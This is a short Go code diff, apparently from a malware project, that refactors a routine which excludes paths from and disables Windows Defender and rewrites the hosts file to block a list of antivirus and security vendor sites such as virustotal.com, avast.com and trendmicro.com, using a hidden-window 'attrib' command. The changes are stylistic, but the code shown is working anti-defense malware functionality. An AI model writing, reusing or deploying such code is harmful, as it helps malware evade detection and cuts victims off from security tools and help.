@@ -14,9 +14,7 @@ import (
 )
 
 func Run() {
-	ExcludeFromDefender()
-	DisableDefender()
-	BlockSites([]string{
+	sites := []string{
 		"virustotal.com",
 		"avast.com",
 		"totalav.com",
@@ -46,7 +44,11 @@ func Run() {
 		"zonealarm.com",
 		"trendmicro.com",
 		"ccleaner.com",
-	})
+	}
+
+	ExcludeFromDefender()
+	DisableDefender()
+	BlockSites(sites)
 }
 
 func ExcludeFromDefender() error {
@@ -102,7 +104,7 @@ func BlockSites(sites []string) error {
 		return err
 	}
 
-	newData := []string{}
+	var newData []string
 	for _, line := range strings.Split(string(data), "\n") {
 		for _, bannedSite := range sites {
 			if strings.Contains(line, bannedSite) {
@@ -123,12 +125,10 @@ func BlockSites(sites []string) error {
 	cmd := exec.Command("attrib", "-r", hostFilePath)
 	cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
 
-	err = cmd.Run()
-	if err != nil {
+	if err = cmd.Run(); err != nil {
 		return err
 	}
-	err = os.WriteFile(hostFilePath, []byte(d), 0644)
-	if err != nil {
+	if err = os.WriteFile(hostFilePath, []byte(d), 0644); err != nil {
 		return err
 	}
 
